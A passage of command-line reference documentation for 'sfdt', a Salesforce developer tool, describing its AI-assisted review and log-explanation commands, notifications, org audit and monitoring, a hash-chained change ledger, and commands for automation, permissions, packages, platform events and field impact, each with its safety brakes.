sfdt changelog release 1.5.0 --package marketing
```

**Arguments:**

| Argument | Description |
|---|---|
| `<version>` | Semver version string. Must match `X.Y.Z` format. |

**Options:**

| Option | Description |
|---|---|
| `--package <name>` | Target a specific package changelog (`changelogs/<name>.md`) |

This command edits the changelog file in place. Run it just before tagging a release. It does not commit — stage and commit the file yourself (or run `sfdt release` which does this as part of its git workflow).

---

#### sfdt changelog check

Validates that the changelog is in sync with the current git state. Warns if you have uncommitted code changes but the `[Unreleased]` section is empty.

```bash
sfdt changelog check
sfdt changelog check --package marketing
```

**Options:**

| Option | Description |
|---|---|
| `--package <name>` | Check a specific package changelog; scopes the git status check to that package's path |

Use this as a pre-commit or CI check to enforce that changes are documented before merging. Exits with code `1` if the changelog needs updating.

---

## Commands: AI Intelligence

### sfdt explain

Analyzes a Salesforce deployment error log. Always runs a fast heuristic scan first (offline-capable), then optionally passes the log to AI for a deeper analysis with root cause identification, failing component list, and suggested fixes.

```bash
sfdt explain                          # analyze the most recent log file in logs/
sfdt explain logs/deploy-2026-04.log  # analyze a specific file
sfdt explain --from-stdin             # pipe a log from another command
sf deploy metadata ... 2>&1 | sfdt explain --from-stdin
sfdt explain --latest                 # explicit: use most recent log (same as default)
```

**Options:**

| Option | Description |
|---|---|
| `[file]` | Path to a log file to analyze |
| `--from-stdin` | Read log content from stdin (pipe-friendly) |
| `--latest` | Explicitly use the most recently modified log in the configured log directory |

**Heuristic patterns (offline, no AI required):**

- Missing fields on objects (`No such column '...' on entity '...'`)
- Unknown Apex symbols (`Variable does not exist`)
- Undefined types (`Invalid type`)
- Coverage failures (`Average test coverage ... is X%`)
- Insufficient access rights, duplicate value constraints, inaccessible entities

**AI analysis (when enabled):** Produces a structured report with:
- **Root Cause** — one or two sentences on the most likely failure cause
- **Failing Components** — bulleted list of component names and their specific errors
- **Suggested Fixes** — ordered, actionable steps with file paths and commands
- **References** — relevant metadata types or Salesforce documentation

Large logs (>512 KB) are automatically truncated to the tail before being sent to the AI, since deployment errors appear at the bottom.

---

### sfdt review

AI-powered code review of your current branch changes versus a base branch. Analyzes the git diff and reports issues across five categories.

```bash
sfdt review
sfdt review --base develop
```

**Options:**

| Option | Description |
|---|---|
| `--base <branch>` | Base branch to diff against (default: `main`) |

Requires `features.ai: true` and a configured provider.

**What it checks:**

- **Governor Limits & Performance** — SOQL/DML inside loops, unbulkified operations, missing LIMIT clauses, inefficient collections
- **Security** — Missing CRUD/FLS checks, SOQL injection via string concatenation, sensitive data in debug logs
- **Null Safety & Error Handling** — Missing null checks, unhandled exceptions in `@AuraEnabled` methods, missing try/catch around DML
- **Test Coverage** — Changed Apex classes without corresponding test class updates, missing assertions, no bulk test scenarios
- **LWC Best Practices** — Wire vs imperative Apex misuse, missing error handling, inline boolean expressions in templates, missing `disconnectedCallback` cleanup

Each finding is rated CRITICAL, HIGH, MEDIUM, or LOW with a specific line reference from the diff. The AI can also read the full source files for additional context.

---

### sfdt pr-description

Generates a GitHub PR description or Slack announcement from the changes between two refs. The AI reads the commit log and the metadata component breakdown to produce a professional, concise description.

```bash
sfdt pr-description                            # GitHub format, main...HEAD, print to stdout
sfdt pr-description --format slack            # Slack mrkdwn format
sfdt pr-description --format markdown         # plain markdown
sfdt pr-description --base develop            # diff from develop
sfdt pr-description --output pr-body.md       # write to file
sfdt pr-description --commit-limit 50         # include up to 50 commits in the context
```

Can also be called as `sfdt pr-desc`.

**Options:**

| Option | Description |
|---|---|
| `--base <ref>` | Base branch or ref (default: `main`) |
| `--head <ref>` | Head ref (default: `HEAD`) |
| `--format <fmt>` | `github` (GitHub-flavored markdown), `slack` (Slack mrkdwn), or `markdown` (plain markdown). Default: `github` |
| `--output <path>` | Write the result to a file instead of stdout |
| `--commit-limit <n>` | Maximum number of commits to include in the AI context (default: 30) |

**GitHub format** produces: Summary, Metadata Changes (grouped by type), Test Plan checklist, Rollback instructions.

**Slack format** produces: a Slack mrkdwn-formatted announcement with bold/emoji formatting, a 1–2 sentence summary, and 3–5 bullet points of key changes.

Requires `features.ai: true` and a configured provider.

---

### sfdt ai

Run a prompt directly through the configured AI provider and print the result to stdout. Useful for ad-hoc AI queries from scripts or the terminal without opening a chat interface.

```bash
sfdt ai prompt "Summarize the latest deployment log"
sfdt ai prompt "What does the error 'FIELD_CUSTOM_VALIDATION_EXCEPTION' mean in Salesforce?"
```

Requires `features.ai: true` and a configured provider.

---

## Commands: Operations

### sfdt config

Read and write individual `.sfdt/config.json` values from the command line using dot notation.

```bash
sfdt config get defaultOrg
sfdt config get deployment.coverageThreshold
sfdt config set deployment.coverageThreshold 80
sfdt config set features.ai true
```

Values are coerced automatically: `"true"` / `"false"` become booleans, numeric strings become numbers, everything else stays a string.

---

### sfdt notify

Provider-agnostic, multi-channel notifier. Dispatches a deployment lifecycle event — or the latest org-health snapshot — to one or more channels: **Slack**, **MS Teams**, **Google Chat**, **generic webhook**, **Grafana Loki**, and **email** (via a lazy-loaded `nodemailer`).

```bash
sfdt notify deploy-success
sfdt notify deploy-failure --org production --version 1.5.0
sfdt notify test-failure --message "Coverage dropped below threshold"
sfdt notify snapshot --type audit          # push the latest audit snapshot
sfdt notify snapshot --type monitor        # push the latest monitor snapshot
```

**Arguments:**

| Argument | Description |
|---|---|
| `<event>` | A lifecycle event (e.g. `deploy-success`, `deploy-failure`, `test-failure`, `release-created`, `harness-escalation`), or `snapshot` to push the latest org-health snapshot |

**Options:**

| Option | Description |
|---|---|
| `--type <kind>` | For `snapshot`: which snapshot to send — `audit` or `monitor` |
| `--version <ver>` | Version label to include in the notification |
| `--org <alias>` | Org alias to display (defaults to `config.defaultOrg`) |
| `--message <msg>` | Custom message body |

**Setup:** Channels are configured under the `notifications` block (`enabled` + a `channels[]` array). Each channel has an `events` filter and a `severityThreshold` that decides whether a given snapshot/event is loud enough to send. Channel secrets are referenced **by env-var NAME** (`webhookUrlEnv`, `headersEnv`, the SMTP `*Env` keys) — never inline.

For a webhook that requires authentication, use `headersEnv` — it maps a header name to the **name** of the env var holding its value, so the token stays out of `.sfdt/config.json`:

```json
{
  "type": "webhook",
  "name": "n8n",
  "webhookUrlEnv": "HARNESS_WEBHOOK_URL",
  "headersEnv": { "X-Auth-Token": "HARNESS_WEBHOOK_TOKEN" }
}
```

`headersEnv` wins over a literal `headers` entry of the same name. If a named env var is unset, that channel fails with an error naming the variable rather than sending the request unauthenticated.

```json
{
  "features": { "notifications": true },
  "notifications": {
    "enabled": true,
    "channels": [
      {
        "type": "slack",
        "webhookUrlEnv": "SLACK_WEBHOOK_URL",
        "events": ["deploy-failure", "test-failure"],
        "severityThreshold": "warn"
      }
    ],
    "summary": { "enabled": true }
  }
}
```

When `notifications.summary.enabled` is set, `notify` first builds an AI executive-summary digest (the editable `monitor-summary` prompt; the snapshot is redacted before it is sent; works for **every** provider) and uses it as the message body.

The org-health commands can push directly: `sfdt audit all --notify` and `sfdt monitor all --notify` dispatch the snapshot they just produced.

The legacy single-Slack shape (`notifications.slack.webhookUrl`) is still honoured for back-compat. If `features.notifications` is `false` or no channel is configured, the command exits with an error and prints setup instructions.

---

### sfdt ui

Starts a local Express server and opens the SFDT web dashboard in your browser. The dashboard reads log files from `logs/` and provides live-run capability for preflight, drift, and smoke scripts.

```bash
sfdt ui                   # opens http://localhost:7654
sfdt ui --port 8080       # custom port
sfdt ui --no-open         # start without opening the browser
```

**Options:**

| Option | Description |
|---|---|
| `-p, --port <n>` | Port to listen on (default: 7654) |
| `--no-open` | Start the server without opening the browser automatically |

The server binds to `127.0.0.1` (localhost only — not exposed to the network).

**Build requirement:** The dashboard must be compiled before first use:

```bash
npm run build:gui
```

When `gui/dist/` is missing, the server shows a build-instructions page instead of the dashboard. The pre-built `gui/dist/` is included in the published npm package so end users don't need to build it.

---

## Commands: Org Health & Operations

Native, clean-room reimplementations of org diagnose/audit, monitoring/backup, documentation, data-set, and scratch-org workflows — no AGPL dependency. Each command queries the org through a shared SOQL helper and writes a normalised JSON snapshot (`logs/audit-latest.json`, `logs/monitor-latest.json`) that the web dashboard, the MCP server, and the [VS Code extension](https://marketplace.visualstudio.com/items?itemName=sfdt.sfdt-devtools) all read.

---

### sfdt audit

Diagnose org health. Runs one check or all of them, prints a normalised result set, and writes `logs/audit-latest.json`.

```bash
sfdt audit                       # run all checks against the default org
sfdt audit all --org production
sfdt audit licenses --json
```

**Arguments:**

| Argument | Description |
|---|---|
| `[check]` | One of `audittrail`, `licenses`, `mfa`, `unused-apex`, `inactive-users`, `api-versions`, or `all` (default) |

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--json` | Emit the normalised snapshot as JSON |

`audit` now runs ~15 checks — in addition to the originals it covers inactive flows, inactive validation rules, inactive workflow rules, unused permission sets, connected apps, missing field descriptions, unreferenced Apex, and object- and field-level access lint. Pass `--notify` to dispatch the resulting snapshot through the notifier. Beta/license-gated checks degrade to `warn` (never `error`) when the org can't run them, so a missing API never fails CI.

Exits non-zero when any check reports `fail` **or** `error` status, so an unreachable org or a missing permission can't read as healthy in CI. Check thresholds are configured under the `audit` block in `.sfdt/config.json`.

#### The `audittrail` check

Reads `SetupAuditTrail` over `audit.auditTrailLookbackDays` (default 30) and reports two
different things.

**Classified changes.** Each matching row carries a **severity** and a category. `critical`
covers changes to who can get in or what they can reach — password policy, session settings,
login IP ranges, Login-As, profile and permission-set assignment, connected apps, named
credentials, certificates. `elevated` covers the rest (deletions, password resets, users frozen
or deactivated). A `critical` row makes the check `fail`; `elevated` alone makes it `warn`.

**Velocity anomalies.** The lookback is split: the most recent
`audit.auditTrailVelocityWindowHours` (default 24) is the observation window, and everything
older is that user's own baseline. A user whose observed changes-per-day exceeds
`audit.auditTrailVelocityFactor` (default 3) × their baseline — and who cleared
`audit.auditTrailVelocityMinEvents` (default 10) in absolute terms — is reported with **both
rates**, so the number can be argued with. A user with no baseline activity is never flagged:
first-seen is not a spike. Velocity runs over every row, not just the classified ones, because a
burst of ordinary changes from one account is exactly the signal.

Because a `critical` change or an anomaly makes the check `fail`, the run exits non-zero — so
this is a **CI gate**, and it also clears the notifier's default `warn` threshold, so
`--notify` reaches Slack/Teams without extra configuration. The generated
`sfdt ci init --type monitor` templates now schedule `sfdt audit all --notify --json` alongside
the monitor run.

> **On completeness.** The sweep is capped at `audit.auditTrailMaxRows` (default 5000). When it
> hits the cap the summary says so **and velocity is skipped** — the rows lost to a cap are the
> oldest, which is precisely the baseline half of the split. This is deliberately not an
> "unpaginated" claim: `sf data query` paginates, but the whole result crosses a subprocess
> buffer, so an unbounded sweep of a busy org trades a silent truncation for a crash. Reporting
> what was cut beats claiming a completeness that can't be delivered.

---

### sfdt monitor

Monitor an org and optionally take a full metadata backup. Writes `logs/monitor-latest.json`.

```bash
sfdt monitor                     # run all monitoring checks
sfdt monitor limits --org production
sfdt monitor all --backup        # checks plus a metadata backup
sfdt monitor backup --org production
```

**Arguments:**

| Argument | Description |
|---|---|
| `[check]` | One of `limits`, `errors`, `health`, `backup`, or `all` (default) |

**Options:**

| Option | Description |
|---|---|
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--backup` | With `all`, also retrieve a full metadata backup into the configured backup directory |
| `--json` | Emit the normalised snapshot as JSON |

`monitor` now runs ~7 checks — in addition to the originals it reports org info, deploy history, deprecated API usage, and flow errors. Pass `--notify` to dispatch the snapshot through the notifier. Beta/license-gated checks degrade to `warn` (never `error`) when the org can't run them. `sfdt monitor schedule` is a thin alias for `sfdt ci init --type monitor`.

Check thresholds (limit warning percentage, minimum Security Health Check score, etc.) are configured under the `monitoring` block in `.sfdt/config.json`.

---

### sfdt dependencies

Answer "what references this component / what does this component reference" by querying `MetadataComponentDependency` (Tooling API), shaped via `@sfdt/flow-core`.

```bash
sfdt dependencies MyApexClass --type apex
sfdt dependencies My_Field__c --type field --org production
sfdt dependencies My_Flow --type flow --json
```

**Arguments:**

| Argument | Description |
|---|---|
| `<name>` | The component name to resolve dependencies for |

**Options:**

| Option | Description |
|---|---|
| `--type <kind>` | Component type: `apex`, `flow`, `field`, `page`, or `lwc` |
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--json` | Emit the sf-native JSON envelope |

---

### sfdt coverage

Report org-wide and per-class Apex code coverage, with a CI gate that exits non-zero when coverage falls below the threshold.

```bash
sfdt coverage
sfdt coverage --threshold 80
sfdt coverage --org production --json
```

**Options:**

| Option | Description |
|---|---|
| `--threshold <pct>` | Minimum acceptable coverage percentage; exits non-zero when below it |
| `--org <alias>` | Target org (defaults to `config.defaultOrg`) |
| `--json` | Emit the sf-native JSON envelope |

---

### sfdt docs

Generate documentation from local metadata.

```bash
sfdt docs generate               # MkDocs-compatible markdown (objects, Apex, flows)
sfdt docs generate --ai          # include an AI-written project overview
sfdt docs diagram                # print a Mermaid ER diagram
sfdt docs diagram --output docs/erd.mmd
```

**Arguments:**

| Argument | Description |
|---|---|
| `<action>` | `generate` (markdown docs) or `diagram` (Mermaid ER diagram) |

**Options:**

| Option | Description |
|---|---|
| `--ai` | Generate an AI project overview (requires `features.ai`; falls back to a heuristic summary otherwise) |
| `--output <file>` | For `diagram`: write the Mermaid source to a file instead of stdout |
| `--json` | Emit machine-readable output |

---

### sfdt ledger

The append-only record of every org change sfdt makes, and how to reverse one.

```bash
sfdt ledger list                 # what has sfdt changed?
sfdt ledger show <id>            # including the state it replaced
sfdt ledger verify               # has the file been tampered with?
sfdt ledger undo <id>            # put it back
```

| Option | Description |
|---|---|
| `--limit <n>` | For `list`: how many to show (default 50) |
| `--yes` | For `undo`: skip the confirmation prompt (required for non-interactive use) |
| `--production` | For `undo`: acknowledge that the org the change was made in is production |
| `--json` | Emit machine-readable output |

**An undo is an org write, and carries the same brakes as the change it reverses.** It needs
`--production` against a production org and a confirmation before it runs — the same two gates
`automation disable` and `permissions grant` use. Without that, the forward change would demand
`--production` while putting it back demanded nothing, and undoing a `permissions grant` *revokes*
access. `undo` takes no `--org`: the target comes from the recorded entry.

`automation disable` and `permissions grant` record the state that preceded them before they
touch the org. That is what makes them reversible — and it is the thing a stage-and-approve UI
cannot do, because approval only ever looks forward. You find out a change was wrong *after* it
lands, which is exactly when a recorded before-state is worth having.

**It is not `run-history` and not `audit.json`.** Neither of those is append-only: run history
deletes all but the newest 200 rows per type on every insert and stores only counts; the GUI audit
log rewrites its whole array capped at 1000, so any past entry can be silently altered by the next
write. Both are right for what they do. Neither can answer *what was there before*.

**Hash-chained.** Each entry's hash covers its content plus the previous entry's, so editing or
deleting any line breaks the chain. `verify` names the first break by both its recorded sequence
number and its current line — when those diverge, that gap is itself the evidence a line was
removed. Only the first break is reported: everything after it is unverifiable, and listing them
all would present consequences as if they were problems.

**Nothing is ever mutated.** Undo appends a compensating entry rather than flipping a flag on the
original, so `ledger verify` still passes afterwards. A second undo of the same change is refused —
it would re-apply it.

**The before-state is stored raw, and redacted only when shown.** It is a *restore payload* —
`undo` writes it straight back to the org — and redaction is lossy and one-way, so a redacted copy
would deploy `[REDACTED]` into a flow or a validation rule during the recovery it exists to
perform. Redaction happens on the read side instead: `ledger list`, `ledger show`, the JSON
envelope and the MCP tools all mask secrets, and nothing carrying an unredacted payload leaves the
process. Treat `logs/ledger.jsonl` with the same care as the org metadata it mirrors.

**Appends are locked across processes.** Computing an entry's sequence number and previous-hash
means reading the file before writing to it, so two concurrent `sfdt` runs could otherwise write
two entries claiming the same predecessor — and `verify` would report the second as tampering. A
lock file beside the ledger serialises that window; a lock left by a killed process is reclaimed
after 30 seconds.

| Status | Meaning |
|---|---|
| `applied` | The write succeeded |
| `failed` | The write was attempted and rejected |
| `undone` | Reversed by a later entry |
| **`pending`** | Recorded, but its outcome never was — the command may have been interrupted mid-write. **Check the org before undoing it.** |

> **A deliberate exception to golden principle #5.** That principle says anything writing history
> degrades silently, so measurement cannot break the measured. The ledger is the one carve-out: if
> the before-state cannot be recorded, **the org write does not happen**. An unrecorded change is
> an unreversible one, and handing you a changed org with no way back is a worse failure than an
> aborted command. Recording the *outcome* afterwards stays best-effort, because by then the org
> has already changed.

---

### sfdt automation

The on/off grid across every kind of Salesforce automation, and the toggles behind it.

```bash
sfdt automation list                                          # what's on?
sfdt automation list --type validation-rule
sfdt automation disable validation-rule Account.Region_Required --dry-run
sfdt automation disable validation-rule Account.Region_Required
sfdt automation enable flow Set_Region
```

#### Five types, three write mechanisms

A grid of uniform toggles implies every row costs the same. It does not, and this is the part a
single button hides:

| Type | Written by | Cost |
|---|---|---|
| Flow (incl. Process Builder) | Tooling `Metadata.activeVersionNumber` | A record write |
| Validation rule | Tooling `Metadata.active` | A record write |
| Duplicate rule | Tooling `Metadata.isActive` | A record write |
| **Workflow rule** | **Metadata deploy** | Retrieve, edit, deploy |
| **Apex trigger** | **Metadata deploy** | In production a Status change *is* a code deployment — **it runs tests** |

Process Builder is **not** a sixth type: a process *is* a Flow, differing only by `ProcessType`.
Listing it separately would be marketing rather than modelling.

#### The read that is a correctness requirement

`Metadata` is a compound field, and writing it **replaces** the object rather than merging. So a
validation-rule toggle reads the whole `Metadata`, changes one key, and writes all of it back.
Sending `{ active: false }` alone would compile, read fine, and discard the rule's formula and
error message the first time it ran. The code refuses to build a write from metadata it never read.

That read is also, conveniently, the before-state — which is why every toggle is reversible.

Deactivating a flow sets `activeVersionNumber` to `0`, which **discards which version was
active**. The ledger records it, so `sfdt ledger undo` restores that exact version; if the version
has since been deleted, the undo fails cleanly rather than activating a different one.

#### Three brakes on every write

- **`--dry-run`** prints the exact body that would be sent and writes nothing.
- **A production guard.** A write against a non-sandbox org is refused unless `--production` is
  passed. Detection **fails safe**: some org shapes omit `isSandbox` entirely, and a failed lookup
  or a missing value is treated as production, because dropping the guard on an org you could not
  identify is the wrong way to be wrong.
- **A confirmation**, unless `--yes`. In a non-interactive context (JSON mode, CI, no TTY) it
  **refuses** rather than auto-confirming — a prompt in CI is either a hang or a silent yes.

---

### sfdt permissions

Object and field access granted by profiles and permission sets. `matrix` and `drift` read; `grant`, `revoke` and `fix` write.

```bash
sfdt permissions matrix Account                      # who can see and edit what
sfdt permissions matrix Account --user ana@acme.com  # what one user gets
sfdt permissions matrix Account --offline            # from the repo, no org

sfdt permissions drift Account --fail-on-drift       # org vs source, as a CI gate
```

#### It says "granted". It will never say "effective"

This is the load-bearing decision, so it is stated first rather than footnoted.

A user's real access is what their profile and permission sets grant **minus** whatever a *muting
permission set* inside a permission set group takes away. Muting permission sets are **Metadata
API only** — there is no queryable sObject for them — so any computed union can be **more
permissive than reality**, and no amount of care with the queries changes that.

A tool that calls that number "effective access" is not slightly imprecise; it is wrong in the
direction that matters, and wrong in a way the reader cannot detect. So every result here is
labelled *granted*, carries the caveat in words, and the word "effective" appears on no piece of
data. A competitor claiming "effective" has the identical blind spot plus a false label.

#### `matrix`

Columns are profiles (prefixed `P:`) then permission sets, in a stable order so two runs are
comparable by eye. Cells are `RW` / `R` / `—`, and edit implies read. Object-level CRUD, View All
and Modify All are reported above the field grid, because a field grant is meaningless without it.

Every query is **scoped to the one object**. A bare `SELECT … FROM FieldPermissions` is 100k–1M
rows in a real org funnelled through `sf` stdout into `JSON.parse`; filtering by `SobjectType`
makes this bounded by construction rather than by a cap that has to be explained. (The existing
`audit lint-access` checks do run unbounded — they answer a different, cheaper question and are
left alone.)

`--user` resolves that user's profile, permission sets, **and permission set groups** — two hops,
because the user is assigned the group while the grants live on its member sets. Skipping the
second hop would silently drop every grant a group carries, and groups are where most large orgs
put their access. When a group is involved the muting caveat is repeated pointing at it by name,
since a group is exactly where muting is used.

An empty result is **not** "nobody has access": Salesforce stores a permission entry only where
access differs from the default, so absence is not denial. The output says so.

#### `grant`, `revoke` and `fix` — the writable half

```bash
sfdt permissions grant Account.Region__c --parent "Sales Ops" --level read
sfdt permissions revoke Account.Secret__c --parent "Sales Ops"
sfdt permissions fix Account --dry-run
```

`ObjectPermissions` and `FieldPermissions` are ordinary updatable sObjects, so these are plain REST
writes. Three shapes are needed, because Salesforce models "no access" as the **absence** of a row
rather than a row saying no: create one to grant, patch it to change a level, delete it to remove
access. Granting `edit` always sends `read` too — the org rejects edit without it.

**Profiles are refused, by name and up front.** Salesforce does not permit direct DML on
profile-owned permission entries; those must go through the Metadata API, so change them in source
and deploy. Refusing explicitly beats letting the org return an opaque
`INSUFFICIENT_ACCESS_OR_READONLY` that reads like a problem with *your* access.

**`fix` is the bulk fix, and its shape is the argument for it.** It applies exactly what
`permissions drift` found `missing-in-org` — with **your repository** as the intended state, so the
target was code-reviewed before it was applied rather than clicked through in a browser. Grants the
org has that source does not (`extra-in-org`) are deliberately **left alone**: removing access
nobody asked to remove is a different and far riskier decision.

Same three brakes as `automation`: `--dry-run`, the production guard, and a confirmation that
refuses rather than auto-confirms when non-interactive. Every change is recorded in the ledger, so
`sfdt ledger undo` restores the prior grants — including after a *partial* failure, since the
recorded before-state covers the whole batch and restoring a field already at its recorded level is
a no-op.

#### `--offline` and `drift` — permissions as a deploy gate

`--offline` reads `profiles/*.profile-meta.xml` and `permissionsets/*.permissionset-meta.xml` from
the repository. No org, so it runs on a pull request. Its bound is different and is stated: source
declares what is **committed**, and an org may carry grants nobody ever put in the repo.

`drift` compares the two directly:

| Verdict | Meaning |
|---|---|
| `extra-in-org` | Granted in the org but **absent from source** — the one a security review cares about |
| `missing-in-org` | Declared in source but not granted in the org |
| `changed` | Both grant it, at different levels |
| `only-in-org` / `only-in-repo` | A profile or permission set present on one side only |

Parents are matched by **label**, because the org identifies them by id and the repository by
filename and those cannot be equated. That is a real limitation, so an unmatched parent is reported
rather than dropped — and `--fail-on-drift` deliberately does **not** gate on it, since an
unmatched parent is usually a naming mismatch rather than an access difference and a noisy gate
gets turned off. Field-level differences are unambiguous, so those do gate.

```yaml
- name: Permissions must match source
  run: npx --yes @sfdt/cli@latest permissions drift Account --org prod --fail-on-drift
```

Not added to the generated CI templates, for the same reason the field gate was not: it is
per-object, so a generic template step would ship everyone a job with no object configured.

---

### sfdt packages

Installed package inventory, annotations, and cross-org version drift.

```bash
sfdt packages list                                    # what's installed, and is it behind?
sfdt packages compare --source uat --target prod      # is prod behind UAT?
sfdt packages compare --source uat --target prod --fail-on-drift
sfdt packages note acme --latest 3.10.0 --url https://vendor.example/releases
```

#### There is no "check for updates" API, and this says so

This is worth stating plainly, because every tool in this category implies otherwise:

- **AppExchange has no public REST API** and no per-listing version feed.
- **`SubscriberPackageVersion` is queryable only in a Dev Hub, for packages you own.** In a
  subscriber org it tells you nothing about a third party's package.
- **`InstalledSubscriberPackage`** — the Tooling object this command reads — gives you the
  *installed* version and nothing about what exists upstream.

So `sfdt packages` never claims to have checked. What it does instead:

| `updateStatus` | What it actually means |
|---|---|
| `unknown` | Nothing was recorded to compare against. **Not** "up to date" |
| `update-available` | Installed is behind a version **a human recorded**, with the date they recorded it |
| `ahead-of-record` | Installed is *newer* than the record — the note is stale, not the org |
| `current` | Matches the recorded version. Still a human's number, and the output says so |

#### `compare` — the update question that *is* answerable

Both orgs are already authenticated, so comparing them needs no vendor API at all. Per package the
verdict is `same`, `source-ahead`, `target-ahead`, `only-in-source`, `only-in-target`, or
**`unknown`** — a package installed in both whose version could not be read. `unknown` is kept
distinct from `same` deliberately: folding them together would let `--fail-on-drift` pass on a
comparison that never happened.

`--fail-on-drift` exits 1 on a real difference and never on `unknown`, for the same reason the
field gate does — a gate that fires on our inability to check gets deleted.

> Version comparison is **numeric, per component**. Under a string compare `3.10.0` sorts below
> `3.9.0`, so an org two minor versions ahead would report as behind and the gate would fire
> backwards. There is a test for exactly this.

#### `note` — why the annotation goes in your repo

`sfdt packages note <namespace> --url … --latest … --owner …` writes **`.sfdt/packages.json`**, a
committed file. That is the whole design: the vendor's URL, the version someone actually checked,
and who owns the relationship become code-reviewed, shared by the team, and readable by CI —
instead of living in one admin's browser and dying with the profile. A hosted product structurally
cannot put your annotations in your repository.

- Keyed by **namespace**, not the subscriber package id, because the id is per-org and the
  annotation is about the *product*.
- Merges **additively**: a field you do not pass is left alone, and keys written by a *newer* sfdt
  are preserved untouched. Pass an empty string to clear a field.
- `--latest` is validated. A value that does not parse as a version is refused rather than stored,
  because a stored non-version compares against nothing forever while its owner believes the
  package is being watched.
- Recording a version stamps the date, so a two-year-old note reads as the weak evidence it is.

The GUI dashboard's **Installed Packages** page is the editor for the same file.

*Considered and rejected:* a Dev Hub `Package2Version` check. It is real, but only covers packages
you publish yourself — not the AppExchange ones this feature exists for. And scraping vendor
listings: the Chrome extension's CSP forbids external hosts outright, and HTML scraping of a
vendor's site is fragile and impolite.

---

### sfdt events

Platform Events and Change Data Capture.

```bash
sfdt events list                                    # what can I subscribe to?
sfdt events tail Order_Placed__e                    # listen for 60s
sfdt events tail AccountChangeEvent --replay all    # replay the retention window
sfdt events publish Order_Placed__e --field Order_Id__c=A-1

# publish, then assert it arrived — an integration test for CI
sfdt events tail Order_Placed__e --expect Status__c=OK --timeout 30
```

`publish` carries the same two brakes as `automation` and `permissions` — a production guard and a
confirmation that refuses rather than auto-confirms when non-interactive. Publishing is a
*behavioural* change rather than a data write: the event fires every subscriber on the channel —
flows, Apex triggers, and any external listener — and a delivered event cannot be recalled. There
is no undo, which is precisely why it is gated going in. `--dry-run` prints the exact body and
sends nothing.

The CometD/Bayeux protocol implementation is [`@sfdt/flow-core`](../packages/flow-core)'s, shared
verbatim with the Chrome extension's background worker. A stateful handshake with a replay
extension and a reconnect policy is exactly the kind of thing two copies would drift on, in ways
that only show up against a real org.

#### `list`

Enumerates custom platform events (`__e`), standard platform events, custom `PlatformEventChannel`
channels, and the entities enrolled in Change Data Capture — each with its Bayeux path. A kind
whose query is refused is reported as *unchecked*; it never silently becomes "your org has none".

#### `tail`

| Option | Description |
|---|---|
| `--replay <id>` | `new` (default), `all` for everything still in the retention window, or a specific replay id |
| `--timeout <seconds>` | Stop after this long. Default 60 — a tail is always bounded |
| `--max <n>` | Stop after this many events |
| `--expect <Field=Value>` | Repeatable. Stop on the first matching event; **exit 1 if none arrives** |
| `--out <file>` | Append each event to a file as NDJSON |
| `--json` | Emit one envelope at the end instead of streaming |

`--replay all` is the one worth knowing: it replays events already in the retention window
(roughly 24 hours, 72 for high-volume), so you can inspect something that has *already* happened
rather than waiting for it to happen again.

`--expect` walks dotted paths into the payload, so CDC's header is reachable:
`--expect payload.ChangeEventHeader.changeType=CREATE`. It compares as strings and requires
**every** pair. This is deliberately not a JSONPath dialect — a matcher nobody can predict is
worse than one that only does the obvious thing.

> **Why `--json` does not stream.** The JSON envelope is one object on stdout (golden principle
> #6); a tail is a stream. Both cannot be true at once, so `--json` prints nothing live and emits
> a single envelope at the end, bounded by `--timeout`/`--max`. Without `--json`, events stream to
> stdout as NDJSON as they arrive and status goes to stderr. The invariant wins over the
> convenience.

Ctrl-C ends a tail cleanly, unsubscribing from the org rather than leaving it holding a
subscription for a process that has exited.

#### `publish`, and the reason it exists

Publishing an event is an ordinary REST POST to `/sobjects/<Event>__e/` — no token, no streaming.
`--dry-run` prints the exact body without sending it.

Paired with `tail --expect`, it becomes a **publish-then-assert integration test that runs in your
pipeline**:

```yaml
- run: npx --yes @sfdt/cli@latest events publish Order_Placed__e --field Order_Id__c=CI-$GITHUB_RUN_ID
- run: npx --yes @sfdt/cli@latest events tail Order_Placed__e --expect Order_Id__c=CI-$GITHUB_RUN_ID --timeout 60
```

Publishing fires **real subscribers** — flows, triggers, and any external system listening. The
MCP tool therefore declares `confirmExecution`.

#### One command in this CLI holds a session token

`tail` is the exception to how everything else here works. Every other command shells out to `sf`
and lets it join the session, which is why sfdt stores no tokens. A CometD long-poll is a single
HTTP connection held open for minutes and `sf` has no subcommand that proxies one, so `tail` reads
an access token via `sf org display` and holds it **in memory for the life of the command**.

What that does and does not change:

- It is read from the `sf` keychain at the moment of use. Nothing is written, cached to disk, or
  persisted between runs — **no new secret is stored anywhere**.
- It is never logged, never placed in the JSON envelope, never put in a snapshot or a notification
  payload, and never accepted from a flag or an environment variable.
- `accessToken` / `sessionId` / `sid` are in the redaction list, so anything that *does* reach a
  log is masked. That is the backstop, not the plan.

All of this lives in one file, `src/lib/org-session.js`, so reviewing it is reading one file
rather than grepping.

---

### sfdt field

Field-level analysis over an org. Read-only.

```bash
sfdt field impact Account.Region__c              # deep: what writes ONE field
sfdt field impact Opportunity.StageName --links

sfdt field usage Account                        # wide: every field on the object
sfdt field usage Account --population            # …and how much data each holds

sfdt field usage Account --offline               # from the repo, no org at all
sfdt field usage Account --offline --fail-on-unreferenced   # a CI gate
```

`impact` answers **"what writes this field?"** from three sources:

| Source | How it is found | Status |
|---|---|---|
| Flows | `MetadataComponentDependency` narrows the candidates, then `@sfdt/flow-core` **parses** each flow's metadata to see which actually write the field | `confirmed` when the metadata states the write |
| Workflow field updates | Tooling `WorkflowFieldUpdate.Metadata.field` names the target field outright | `confirmed` |
| Apex | Tooling SOSL text search over class and trigger source | **always `inferred`** — a text hit is not a write |

Alongside the writers it lists **other references** — validation rules, page layouts, reports,
email templates, list views and formula fields — in a separate section, from the dependency edges
Salesforce records. These are kept apart from the writers on purpose:

> *What writes this field* and *where does this field appear* are different questions with
> different consequences. A validation rule referencing the field is useless when you are working
> out what changed a value, and essential when you are working out what a change would break.

One dependency query buys every referencing type at once. Four bespoke per-type scans would each
need a list-then-read-`Metadata` pass (Tooling serves compound `Metadata` one row at a time), cost
an order of magnitude more round trips, and still miss whatever type nobody thought to add.
Reports in particular have no queryable column list — the dependency edge is the only cheap record
that a report uses a field.

The engine is [`@sfdt/flow-core`](../packages/flow-core)'s `analyzeFieldImpact`, shared verbatim
with the Chrome extension's Field Impact panel, so both surfaces scan an org to the same depth
and hedge in the same words.

**Options:**

| Option | Description |
